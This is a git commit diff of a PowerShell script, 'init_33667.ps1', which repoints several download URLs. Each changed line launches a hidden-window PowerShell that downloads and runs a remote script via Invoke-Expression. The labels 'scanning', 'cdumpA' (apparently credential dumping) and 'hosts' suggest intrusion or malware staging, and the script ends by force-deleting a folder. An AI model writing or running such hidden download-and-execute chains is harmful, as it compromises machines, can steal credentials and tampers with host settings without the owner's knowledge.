2e0e52106da36813a9859b4fc82245a9e05e687a
tameval <114147355+tameval@users.noreply.github.com>
2022-10-30 17:04:20 +0900

    Update init_33667.ps1

--- 33667/init_33667.ps1
+++ 33667/init_33667.ps1
@@ -16,16 +16,16 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 #7zip
 if ((Get-Item -Path 'C:\Program Files\7-Zip\7z.exe' -eq $null)
 {
-    powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/7zip_33667.ps1')"
+    powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/7zip_33667.ps1')"
 }
 
 #scanning
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/scan_33667.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/scan_33667.ps1')"
 
 #cdumpA
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/cdumpa_33667.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/cdumpa_33667.ps1')"
 
 #hosts
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/hosts_33667.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/33667/hosts_33667.ps1')"
 
 Remove-Item C:\CRDemo -Recurse -Force
